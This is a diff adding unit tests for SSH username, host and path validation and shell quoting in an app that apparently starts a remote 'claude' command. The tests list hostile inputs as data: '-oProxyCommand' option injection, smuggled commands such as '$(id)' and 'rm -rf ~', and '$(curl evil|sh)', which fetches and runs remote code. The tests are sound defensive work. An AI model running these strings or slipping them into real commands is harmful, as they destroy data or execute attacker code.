@@ -1,5 +1,20 @@
 import { describe, it, expect } from 'vitest'
-import { mergeSecrets, cleanHostFields, cleanHostText, decodeHostsFile, refuseOverwriteMessage, connectionFieldsChanged } from './ssh-host-pure'
+import {
+  mergeSecrets,
+  cleanHostFields,
+  cleanHostText,
+  decodeHostsFile,
+  refuseOverwriteMessage,
+  connectionFieldsChanged,
+  hasControlChars,
+  hostFieldProblem,
+  hostFieldProblemKey,
+  isSafeSshHost,
+  isSafeSshUsername,
+  quotePosix,
+  remoteCommandWord,
+  sshDestinationArgs
+} from './ssh-host-pure'
 import { makeT } from '../shared/i18n'
 
 describe('cleanHostText', () => {
@@ -157,5 +172,100 @@ describe('connectionFieldsChanged', () => {
     expect(connectionFieldsChanged(prev, { ...prev, password: null })).toBe(true)
     expect(connectionFieldsChanged(prev, { ...prev, passphrase: undefined })).toBe(false)
     expect(connectionFieldsChanged(prev, { ...prev, passphrase: '' })).toBe(false)
+  })
+})
+
+describe('isSafeSshUsername', () => {
+  it('accepts ordinary and directory login names', () => {
+    for (const u of ['root', 'jdl', 'deploy-bot', 'svc_app', 'a.b', '1000', 'joao@corp.example', 'CORP\\joao', 'HOST$']) {
+      expect(isSafeSshUsername(u), u).toBe(true)
+    }
+  })
+
+  it('refuses option-like, empty, spaced, control and shell-special names', () => {
+    for (const u of ['', '-oProxyCommand=calc', '-l', 'a b', 'a\tb', 'root\n', 'a\u0000b', "o'neil", 'a;b', 'a`id`', '$(id)', 'a|b', 'joão', 'x'.repeat(257)]) {
+      expect(isSafeSshUsername(u), JSON.stringify(u)).toBe(false)
+    }
+  })
+})
+
+describe('isSafeSshHost', () => {
+  it('accepts hostnames, IPv4 and IPv6 (bare, bracketed, with a zone)', () => {
+    for (const h of ['pve-01', 'srv.example.com', 'srv.example.com.', 'my_host.lan', '192.168.1.10', '::1', 'fe80::1%eth0', '[2001:db8::1]', '2001:db8::1']) {
+      expect(isSafeSshHost(h), h).toBe(true)
+    }
+  })
+
+  it('refuses option-like, spaced, control and malformed hosts', () => {
+    for (const h of ['', '-oProxyCommand=calc.exe', '-p', 'a b', 'host\n', 'host\u0007', 'a..b', 'host-', '-host', 'a.-b', 'user@host', 'host;id', '$(id)', '[::1', 'fe80::1%eth0;id', 'x'.repeat(254)]) {
+      expect(isSafeSshHost(h), JSON.stringify(h)).toBe(false)
+    }
+  })
+})
+
+describe('hasControlChars', () => {
+  it('finds C0, DEL and C1 controls', () => {
+    expect(hasControlChars('/srv/app')).toBe(false)
+    expect(hasControlChars('/srv/my app')).toBe(false)
+    for (const s of ['a\nb', 'a\rb', '\u0003', 'a\u007f', 'a\u009b']) expect(hasControlChars(s)).toBe(true)
+  })
+})
+
+describe('hostFieldProblem', () => {
+  const ok = { host: 'srv.lan', username: 'root' }
+
+  it('is null for a usable host', () => {
+    expect(hostFieldProblem(ok)).toBeNull()
+    expect(hostFieldProblem({ ...ok, remotePath: "/srv/o'neil app", claudePath: '~/.local/bin/claude' })).toBeNull()
+  })
+
+  it('names the first bad field', () => {
+    expect(hostFieldProblem({ ...ok, username: '-oProxyCommand=x' })).toBe('username')
+    expect(hostFieldProblem({ ...ok, host: '-oProxyCommand=x' })).toBe('host')
+    expect(hostFieldProblem({ ...ok, remotePath: '/srv\u0003touch /tmp/x\r' })).toBe('remotePath')
+    expect(hostFieldProblem({ ...ok, claudePath: 'claude\nrm -rf ~' })).toBe('claudePath')
+  })
+
+  it('maps to a key both dictionaries carry', () => {
+    const tEn = makeT('en')
+    const tPt = makeT('pt-PT')
+    for (const p of ['username', 'host', 'remotePath', 'claudePath'] as const) {
+      const key = hostFieldProblemKey(p)
+      expect(tEn(key)).not.toBe(key)
+      expect(tPt(key)).not.toBe(key)
+    }
+  })
+})
+
+describe('sshDestinationArgs', () => {
+  it('ends the options with -- before user@host', () => {
+    expect(sshDestinationArgs('root', 'srv.lan')).toEqual(['--', 'root@srv.lan'])
+    expect(sshDestinationArgs('joao@corp.example', '10.0.0.5')).toEqual(['--', 'joao@corp.example@10.0.0.5'])
+  })
+
+  it('refuses a hostile user or host', () => {
+    expect(sshDestinationArgs('-oProxyCommand=calc', 'srv')).toBeNull()
+    expect(sshDestinationArgs('root', '-oProxyCommand=calc')).toBeNull()
+    expect(sshDestinationArgs('root', 'srv -oProxyCommand=calc')).toBeNull()
+  })
+})
+
+describe('quotePosix / remoteCommandWord', () => {
+  it('single-quotes and escapes embedded quotes', () => {
+    expect(quotePosix('claude')).toBe("'claude'")
+    expect(quotePosix("it's")).toBe("'it'\\''s'")
+  })
+
+  it('keeps metacharacters inert', () => {
+    expect(remoteCommandWord('claude; rm -rf ~')).toBe("'claude; rm -rf ~'")
+    expect(remoteCommandWord('$(curl evil|sh)')).toBe("'$(curl evil|sh)'")
+    expect(remoteCommandWord("/opt/x'; id; echo '")).toBe("'/opt/x'\\''; id; echo '\\'''")
+    expect(remoteCommandWord('/usr/local/bin/claude')).toBe("'/usr/local/bin/claude'")
+  })
+
+  it('leaves a leading ~/ unquoted so the remote shell still expands it', () => {
+    expect(remoteCommandWord('~/.local/bin/claude')).toBe("~/'.local/bin/claude'")
+    expect(remoteCommandWord('~/a b/$(id)')).toBe("~/'a b/$(id)'")
+    expect(remoteCommandWord('~root/claude')).toBe("'~root/claude'")
   })
 })
